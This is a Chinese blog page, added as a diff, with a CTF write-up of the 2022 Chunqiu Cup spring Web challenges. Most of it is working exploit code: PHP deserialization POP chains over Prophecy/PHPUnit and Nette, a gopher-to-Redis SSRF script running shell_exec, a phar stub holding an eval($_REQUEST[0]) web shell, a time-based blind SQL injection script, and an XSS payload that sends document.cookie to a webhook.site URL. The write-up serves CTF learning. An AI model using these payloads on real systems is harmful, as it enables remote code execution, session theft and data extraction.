@@ -1,0 +1,622 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【WP】2022年春秋杯春季赛 Web 类题目解析 | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="2022 春秋杯春季赛 Web 2 题 WP，EasySwoole + Redis 反序列化 + gopher 注入 + PHPUnit Mock 链 RCE。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【WP】2022年春秋杯春季赛 Web 类题目解析">
+<meta property="og:url" content="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Web/WP-2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9BWeb%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="2022 春秋杯春季赛 Web 2 题 WP，EasySwoole + Redis 反序列化 + gopher 注入 + PHPUnit Mock 链 RCE。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="Swoole">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Web/WP-2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9BWeb%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【WP】2022年春秋杯春季赛 Web 类题目解析',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【WP】2022年春秋杯春季赛 Web 类题目解析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-31T16:00:00.000Z" title="发表于 2022-01-01 00:00:00">2022-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-31T16:00:00.000Z" title="更新于 2022-01-01 00:00:00">2022-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="【WP】2022年春秋杯春季赛 Web 类题目解析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/42191.html">https://www.ctfiot.com/42191.html</a><br>ID: 42191</p>
+</blockquote>
+<p>easy-swoole</p>
+<p>本题考察选手对构造php反序列化和利用gopher协议的能力。在Redis类中可以发现，数据是经过序列化之后存储到redis中的。</p>
+<p>class Redis extends EasySwooleRedisRedis{<br>    public function __construct()<br>    {<br>        parent::<br>__construct(new EasySwooleRedisConfigRedisConfig([<br>            ‘host’ &#x3D;&gt; ‘redis’,<br>            ‘port’ &#x3D;&gt; ‘6379’,<br>            ‘auth’ &#x3D;&gt; ‘123456’,<br>            ‘serialize’ &#x3D;&gt; EasySwooleRedisConfigRedisConfig::<br>SERIALIZE_PHP<br>        ]));<br>    }<br>}</p>
+<p>而在爬虫的代码中可以发现，没有对协议做任何过滤，因此我们可以通过gopher协议向redis中伪造一条序列化数据，在程序读取缓存时触发反序列化rce。</p>
+<p>private static function make_request($url)<br>{<br>    $ch &#x3D; curl_init();<br>    curl_setopt($ch, CURLOPT_URL, $url);<br>    curl_setopt($ch, CURLOPT_HEADER, 0);<br>    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);<br>    curl_setopt($ch, CURLOPT_TIMEOUT, 2);<br>    $output &#x3D; curl_exec($ch);<br>    curl_close($ch);<br>    return $output;<br>}</p>
+<p>反序列化的入口点选取了EasySwooleHttpMessageUploadFile，他的__destruct函数调用了$this-&gt;stream-&gt;close函数。同时观察到easyswoole依赖Prophecy，而Prophecy存在一条已知的利用链，该利用链从__call函数开始，正好衔接了之前的$this-&gt;stream-&gt;close，但是Prophecy这条利用链需要用到依赖中不存在的Faker，无法直接利用。最后用了phpunit中的PHPUnitFrameworkMockObjectMockTrait，它正好有一个generate方法，并且调用了eval，实现了RCE。</p>
+<p>最后生成pop链的代码如下，由于swoole不同于fastcgi的运行方式，system函数无法直接输出到网页中，所以采取了抛出异常的方式来获取回显。</p>
+<?php
+
+namespace EasySwooleHttpMessage{
+    class UploadFile{
+        public $stream;
+        function __construct($stream){
+            $this->stream = $stream;
+        }
+    }
+}
+
+namespace ProphecyProphecy{
+    class ObjectProphecy{
+        public $lazyDouble;
+        public $revealer;
+        function __construct($lazyDouble){
+            $this->revealer = $this;
+            $this->lazyDouble = $lazyDouble;
+        }
+    }
+}
+
+namespace ProphecyDoubler{
+    class LazyDouble{
+        public $doubler;
+        public $argument;
+        public $class;
+        public $interfaces;
+        function __construct($doubler){
+            $this->doubler = $doubler;
+            $this->class = null;
+            $this->argument = [];
+            $this->interfaces = [];
+        }
+    }
+    class Doubler{
+        public $mirror;
+        public $creator;
+        public $namer;
+        public $patches;
+        function __construct($creator){
+            $this->namer = new NameGenerator();
+            $this->mirror = new ProphecyDoublerGeneratorClassMirror();
+            $this->creator = $creator;
+            $this->patches = [];
+        }
+    }
+    class NameGenerator{}
+}
+
+namespace ProphecyDoublerGenerator{
+    class ClassMirror{}
+    class ClassCreator{
+        public $generator;
+        function __construct($generator){
+            $this->generator = $generator;
+        }
+    }
+}
+
+namespace PHPUnitFrameworkMockObject{
+    class MockTrait{
+        public $classCode;
+        public $mockName;
+        function __construct($code){
+            $this->mockName = "";
+            $this->classCode = $code;
+        }
+    }
+}
+
+namespace {
+    $mockObject = new PHPUnitFrameworkMockObjectMockTrait('throw new ErrorException(shell_exec("/readflag"));');
+    $classCreator = new ProphecyDoublerGeneratorClassCreator($mockObject);
+    $doubler = new ProphecyDoublerDoubler($classCreator);
+    $lazyDouble = new ProphecyDoublerLazyDouble($doubler);
+    $objectProphecy = new ProphecyProphecyObjectProphecy($lazyDouble);
+    $message = new EasySwooleHttpMessageUploadFile($objectProphecy);
+    echo base64_encode(serialize($message));
+}
+
+将生成的pop链写入到redis中，并将写入流量转换成gopher协议，最终利用exp如下
+
+import sys
+import requests
+import re
+
+if len(sys.argv) < 2:
+    print(sys.argv[0]+" target-ip:
+port")
+    exit()
+
+url = "http://"+sys.argv[1]+"/crawler"
+data = "gopher://redis:
+6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%246%0D%0A123456%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Ahttp%3A%2F%2Fexp%0D%0A%24652%0D%0AO%3A34%3A%22EasySwoole%5CHttp%5CMessage%5CUploadFile%22%3A1%3A%7Bs%3A6%3A%22stream%22%3BO%3A32%3A%22Prophecy%5CProphecy%5CObjectProphecy%22%3A2%3A%7Bs%3A10%3A%22lazyDouble%22%3BO%3A27%3A%22Prophecy%5CDoubler%5CLazyDouble%22%3A4%3A%7Bs%3A7%3A%22doubler%22%3BO%3A24%3A%22Prophecy%5CDoubler%5CDoubler%22%3A4%3A%7Bs%3A6%3A%22mirror%22%3BO%3A38%3A%22Prophecy%5CDoubler%5CGenerator%5CClassMirror%22%3A0%3A%7B%7Ds%3A7%3A%22creator%22%3BO%3A39%3A%22Prophecy%5CDoubler%5CGenerator%5CClassCreator%22%3A1%3A%7Bs%3A9%3A%22generator%22%3BO%3A38%3A%22PHPUnit%5CFramework%5CMockObject%5CMockTrait%22%3A2%3A%7Bs%3A9%3A%22classCode%22%3Bs%3A50%3A%22throw%20new%20ErrorException%28shell_exec%28%22%2Freadflag%22%29%29%3B%22%3Bs%3A8%3A%22mockName%22%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A5%3A%22namer%22%3BO%3A30%3A%22Prophecy%5CDoubler%5CNameGenerator%22%3A0%3A%7B%7Ds%3A7%3A%22patches%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22argument%22%3Ba%3A0%3A%7B%7Ds%3A5%3A%22class%22%3BN%3Bs%3A10%3A%22interfaces%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22revealer%22%3Br%3A2%3B%7D%7D%0D%0A"
+
+r = requests.get(url,params={"url":
+data})
+# print(r.text)
+r = requests.get(url,params={"url":"http://exp"})
+r = re.findall(r'(flag{[0-9a-f-]+})',r.text)
+print(r[0])
+
+signin-service
+
+难点主要在于前面考察选手对于promise的熟悉程度，知道可以通过某种手段使其阻塞，并灵活的分析题目源码，到达越权的效果。后面xss的部分是客户端原型链污染配合了一个dom xss 就算是比较简单了。
+
+先自己随便注册个号，然后运行命令
+
+curl http://127.0.0.1/user/change -H "Content-Type: application/json" -H "Cookie: ctf=这里是你自己的值" -d '{"bio":"sss","username":"admin","op":"UPP.save"}'
+
+接着访问/user/home可以看到自己的名字成功的改成了admin
+
+接下来使用常用的md5脚本跑个验证码
+
+import hashlib
+
+for i in range(0,10485760):
+ m = hashlib.md5()
+ b = str(i).encode(encoding='utf-8')
+ m.update(b)
+ md = m.hexdigest()
+ 
+ if md[0:6] == '7c0d5f':
+   print(i)
+   break
+
+输入验证码和payload如下
+
+__proto__[tagReplacementText]=&name=<sss>&passwd=navigator.sendBeacon(`https://webhook.site/67012a5d-b312-4786-8c6c-cab47a7aa7ea`,document.cookie)
+
+webhook拿flag就行了
+
+sql_debug
+
+根据源码中install.php的内容可以发现配置文件写入和tmp下文件写入
+
+在控制器目录中可以发现Test控制器 只有一个sql注入的地方
+
+实测也失败（因为环境里没有mysql
+
+数据库配置可控的情况下尝试使用恶意mysql服务器读取文件 发现失败 无法连接到远程服务器
+
+PHP内核审计
+
+我们分析php内核源码可以发现ext/pdo/pdo_dbh.c的dsn_from_uri函数存在php_stream_open_wrapper函数 也就是可以触发phar反序列化。
+
+查找调用可以发现dsn_from_uri在ext/pdo/pdo_dbh.c的PHP_METHOD函数中被调用,调用条件是uri:开头
+
+查看实现方法发现是是PDO的__construct构造方法
+
+本次测试代码发现dsn字符串中uri设置为phar即可触发phar反序列化
+
+<?php
+include_once "classTest.php";
+
+$dbms='mysql';     //数据库类型
+$host='localhost'; //数据库主机名
+$dbName='test';    //使用的数据库
+$user='root';      //数据库连接用户名
+$pass='';          //对应的密码
+$dsn="uri:
+phar://phar.phar/$dbms:
+host=$host;dbname=$dbName";
+
+try {
+    $dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象
+    echo "连接成功
+";
+    $dbh = null;
+} catch (PDOException $e) {
+    die ("Error!: " . $e->getMessage() . "
+");
+}
+$db = new PDO($dsn, $user, $pass, array(PDO::
+ATTR_PERSISTENT => true));
+
+?>
+
+<p>所以本题需要先挖掘php反序列化链</p>
+<p>Nette框架POP链</p>
+<p>文件包含</p>
+<p>搜索入口可以找到Selection类</p>
+<p>跟进发现需要先满足一个if判断，其中需要关注getSelect和getGeneralCacheKey方法</p>
+<p>getSelect方法直接返回数据</p>
+<p>getGeneralCacheKey方法也返回数据</p>
+<p>寻找load方法时在namespace NetteDIConfigAdapters的PhpAdapter类中发现文件包含  我们可以在写phar到&#x2F;tmp&#x2F;install.lock 随后反序列化包含 执行rce</p>
+<p>构造链如下:</p>
+<?php
+
+namespace NetteDIConfigAdapters{
+    class PhpAdapter{
+    }
+}
+namespace NetteDatabaseTable {
+
+    use NetteDIConfigAdaptersPhpAdapter;
+
+    class SqlBuilder
+    {
+    }
+
+    class Selection
+    {
+        protected $observeCache;
+        protected $sqlBuilder;
+        protected $accessedColumns;
+        protected $previousAccessedColumns;
+        protected $generalCacheKey;
+        protected $cache;
+
+        public function __construct()
+        {
+            $this->observeCache = $this;
+            $this->cache = new PhpAdapter();
+            $this->sqlBuilder = new SqlBuilder();
+            $this->accessedColumns = "1";
+            $this->generalCacheKey = "/etc/passwd"; //需要包含的文件
+            $this->previousAccessedColumns = "222";
+        }
+    }
+}
+
+namespace {
+
+    use NetteDatabaseTableSelection;
+    $poc = new Selection();
+    echo urlencode(serialize($poc));
+    @unlink("phar.phar");
+    $phar = new Phar("phar.phar"); //后缀名必须为phar
+    $phar->startBuffering();
+    $phar->setStub("<?php __HALT_COMPILER(); ?><p>“); &#x2F;&#x2F;设置stub<br>    $phar-&gt;setMetadata($poc); &#x2F;&#x2F;将自定义的meta-data存入manifest<br>    $phar-&gt;addFromString(“test.txt”, “test”); &#x2F;&#x2F;添加要压缩的文件<br>    &#x2F;&#x2F;签名自动计算<br>    $phar-&gt;stopBuffering();<br>}</p>
+<p>本地修改下源码测试pop链可以打通</p>
+<p>接下来我们把phar修改一下上传</p>
+<?php
+
+namespace NetteDIConfigAdapters{
+    class PhpAdapter{
+    }
+}
+namespace NetteDatabaseTable {
+
+    use NetteDIConfigAdaptersPhpAdapter;
+
+    class SqlBuilder
+    {
+    }
+
+    class Selection
+    {
+        protected $observeCache;
+        protected $sqlBuilder;
+        protected $accessedColumns;
+        protected $previousAccessedColumns;
+        protected $generalCacheKey;
+        protected $cache;
+
+        public function __construct()
+        {
+            $this->observeCache = $this;
+            $this->cache = new PhpAdapter();
+            $this->sqlBuilder = new SqlBuilder();
+            $this->accessedColumns = "1";
+            $this->generalCacheKey = "/tmp/install.lock"; //需要包含的文件
+            $this->previousAccessedColumns = "222";
+        }
+    }
+}
+
+namespace {
+
+    use NetteDatabaseTableSelection;
+    $poc = new Selection();
+//    echo urlencode(serialize($poc));
+    @unlink("phar.phar");
+    $phar = new Phar("phar.phar"); //后缀名必须为phar
+    $phar->startBuffering();
+    $phar->setStub("<?php eval($_REQUEST[0]);__HALT_COMPILER(); ?><p>“); &#x2F;&#x2F;shell放在stub前面<br>    $phar-&gt;setMetadata($poc); &#x2F;&#x2F;将自定义的meta-data存入manifest<br>    $phar-&gt;addFromString(“test.txt”, “123”); &#x2F;&#x2F;添加要压缩的文件<br>    &#x2F;&#x2F;签名自动计算<br>    $phar-&gt;stopBuffering();<br>    echo urlencode(serialize(file_get_contents(“phar.phar”)));</p>
+<p>}</p>
+<p>GET &#x2F;install.php?ip&#x3D;127.0.0.1&amp;content&#x3D;s%3A461%3A%22%3C%3Fphp+eval%28%24_REQUEST%5B0%5D%29%3B__HALT_COMPILER%28%29%3B+%3F%3E%0D%0Az%01%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00D%01%00%00O%3A30%3A%22Nette%5CDatabase%5CTable%5CSelection%22%3A6%3A%7Bs%3A15%3A%22%00%2A%00observeCache%22%3Br%3A1%3Bs%3A13%3A%22%00%2A%00sqlBuilder%22%3BO%3A31%3A%22Nette%5CDatabase%5CTable%5CSqlBuilder%22%3A0%3A%7B%7Ds%3A18%3A%22%00%2A%00accessedColumns%22%3Bs%3A1%3A%221%22%3Bs%3A26%3A%22%00%2A%00previousAccessedColumns%22%3Bs%3A3%3A%22222%22%3Bs%3A18%3A%22%00%2A%00generalCacheKey%22%3Bs%3A17%3A%22%2Ftmp%2Finstall.lock%22%3Bs%3A8%3A%22%00%2A%00cache%22%3BO%3A35%3A%22Nette%5CDI%5CConfig%5CAdapters%5CPhpAdapter%22%3A0%3A%7B%7D%7D%08%00%00%00test.txt%03%00%00%00%8464b%03%00%00%00%D2cH%88%A4%01%00%00%00%00%00%00123%EF.c%C3%26%F0%F2%2F%84B%E6%0B%8E%8B%EC%09k3%E0%BB%02%00%00%00GBMB%22%3B&amp;step&#x3D;2&amp;action&#x3D;%E5%AE%89%E8%A3%85 HTTP&#x2F;1.1<br>Host: 127.0.0.1:<br>888<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko&#x2F;20100101 Firefox&#x2F;99.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: _nss&#x3D;1<br>Upgrade-Insecure-Requests: 1<br>Sec-Fetch-Dest: document<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-Site: none<br>Sec-Fetch-User: ?1</p>
+<p>随后写入配置文件</p>
+<p>GET &#x2F;install.php?type&#x3D;uri:<br>phar:&#x2F;&#x2F;&#x2F;tmp&#x2F;install.lock&#x2F;mysql&amp;ip&#x3D;127.0.0.1&amp;db&#x3D;mysql&amp;step&#x3D;1&amp;action&#x3D;%E5%AE%89%E8%A3%85 HTTP&#x2F;1.1<br>Host: 127.0.0.1:<br>888<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko&#x2F;20100101 Firefox&#x2F;99.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Referer: <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a>:<br>888&#x2F;install.php<br>Cookie: _nss&#x3D;1<br>Upgrade-Insecure-Requests: 1<br>Sec-Fetch-Dest: document<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-Site: same-origin<br>Sec-Fetch-User: ?1</p>
+<p>访问test路径触发phar反序列化 执行命令获取flag</p>
+<p>sql_ctfer</p>
+<p>sql注入，编写python代码：</p>
+<p>import xlwt<br>import requests<br>import time<br>url&#x3D;”<a target="_blank" rel="noopener" href="http://ip/">http://IP</a>:<br>PORT&#x2F;index.php?id&#x3D;1%27”<br>def write_execl(ord_id):<br> wb &#x3D; xlwt.Workbook();<br> ws &#x3D; wb.add_sheet(“sheet1”)<br> ws.write(0,0,ord_id)<br> ws.write(0,1,’b’)<br> ws.write(0,2,’c’)<br> wb.save(“ok.xls”)<br>def sqli():<br> flag&#x3D;’’<br> sql_str&#x3D;”abcdeflagQWERTYUIOPASDFGHJKLZXCVBNM1234567890-{}”<br> for i in range(1,20):<br>  for s in sql_str:<br>   startTime&#x3D;time.time()<br>   sql_payload&#x3D;”123123’ oorr case when(substr((selselectect group_concat(flag) from flag) from {} foorr 1 )&#x3D;’{}’) then sleep(5) else 1 end – a”.format(i,s)<br>   print(sql_payload)<br>   write_execl(sql_payload)<br>   file&#x3D;{‘file’:<br>open(‘ok.xls’,’rb’)}<br>   r&#x3D;requests.post(url,files&#x3D;file)<br>   if time.time()-startTime&gt;4:<br>    print(s)<br>    flag&#x3D;flag+s<br>    break<br> print(flag)<br>sqli()</p>
+<p>easy_php</p>
+<p>打开题目，发现是一个unpack数据处理，存在三个函数的调用</p>
+<p>首先尝试构造phpinfo 只需要处理一下pack的格式就好  这里先写了一个自动构造pack的php文件</p>
+<?php
+function request_by_curl($remote_server, $post_string) {
+  $ch = curl_init();
+  curl_setopt($ch, CURLOPT_URL, $remote_server);
+  curl_setopt($ch, CURLOPT_POSTFIELDS, $post_string);
+  curl_setopt($ch, CURLOPT_USERAGENT, "");
+  $data = curl_exec($ch);
+  curl_close($ch);
+}
+
+function go($func,$args){
+  return pack("lllllla*a*", 0, 0, 0, 0, strlen($func), strlen($args), $func, $args);
+}
+request_by_curl('http://127.0.0.1/index.php', go($_GET['cmd'],$_GET['args']));
+?>
+
